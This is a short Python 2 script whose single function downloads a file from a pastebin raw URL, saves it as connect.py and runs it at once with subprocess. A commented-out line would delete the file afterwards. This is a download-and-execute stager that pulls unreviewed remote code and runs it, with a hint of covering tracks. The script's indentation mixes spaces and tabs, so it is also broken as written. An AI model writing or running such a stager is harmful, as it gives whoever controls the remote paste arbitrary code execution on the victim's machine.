import os
import urllib
import subprocess


def ran():
        print "[ + ] Connection [ + ]"
	testfile = urllib.URLopener()
	testfile.retrieve("http://pastebin.com/raw/qNjByHqW", "connect.py")
	ls_output=subprocess.Popen(["python", "connect.py"], stdout=subprocess.PIPE)
	#os.remove("connect.py")
